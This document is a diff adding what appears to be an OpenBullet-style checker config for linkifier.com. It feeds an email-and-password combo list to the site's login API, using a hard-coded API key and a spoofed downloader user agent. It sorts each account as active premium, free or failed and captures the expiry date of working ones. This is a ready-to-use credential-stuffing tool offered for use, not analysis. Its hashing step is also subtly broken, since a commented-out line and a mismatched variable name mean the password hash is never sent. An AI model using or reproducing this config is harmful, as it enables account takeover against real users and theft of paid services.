@@ -1,0 +1,55 @@
+[SETTINGS]
+{
+  "Name": "linkifier.com",
+  "SuggestedBots": 15,
+  "LastModified": "2018-09-30T17:54:43.1116527+00:00",
+  "AdditionalInfo": "",
+  "Author": "meinname",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [
+    {
+      "SliceName": "USER",
+      "RuleType": 2,
+      "RuleString": "1",
+      "Id": 669220010
+    },
+    {
+      "SliceName": "PASS",
+      "RuleType": 2,
+      "RuleString": "1",
+      "Id": 1222891497
+    }
+  ],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#MD5 FUNCTION Hash MD5 "<PASS>" -> VAR "MD5PASSWORD" 
+REQUEST POST "https://api.linkifier.com/downloadapi.svc/user" AutoRedirect=TRUE 
+  CONTENT "{\"login\":\"<USER>\",\"md5Pass\":\"<MD5PASS>\",\"apiKey\":\"d046c4309bb7cabd19f49118a2ab25e0\"}" 
+  CONTENTTYPE "application/json; charset=utf-8" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: jdownloader2" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "\"isActive\":true" 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY "\"isActive\":false" 
+  KEYCHAIN Failure OR 
+    KEY "\"hasErrors\":true" 
+PARSE "<SOURCE>" JSON "expirydate" Recursive=FALSE -> VAR "EXPIRESUNIX1000" "" "" 
+#MillistoUnix FUNCTION Substring "0" "10" "<EXPIRESUNIX1000>" -> VAR "EXPIRESUNIX" 
+#UnixtoDate FUNCTION UnixTimeToDate "<EXPIRESUNIX>" -> CAP "Expires" 
